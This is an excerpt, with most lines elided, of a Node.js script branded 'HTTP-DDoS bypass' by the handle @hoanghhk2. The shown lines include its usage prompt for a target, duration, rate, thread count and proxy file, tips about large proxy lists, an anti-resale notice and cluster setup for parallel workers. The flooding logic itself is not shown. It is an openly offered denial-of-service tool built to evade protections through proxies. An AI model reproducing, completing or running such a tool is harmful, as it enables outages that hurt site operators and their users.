...
process.on("unhandledRejection", errorHandler);
 ...
 if (process.argv.length < 7){console.log(`@hoanghhk2 Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
...
const tips1 =[
 ...
 "recommended big proxyfile if target is hoanghhk2",
 "dont trying resell my script!! @hoanghhk2",
...
const RESTART_DELAY = 1000;
 ...
 if (cluster.isMaster) {
    console.clear()
    console.log(`HTTP-DDoS bypass by: @hoanghhk2`.rainbow)
    console.log(`--------------------------------------------`.gray)
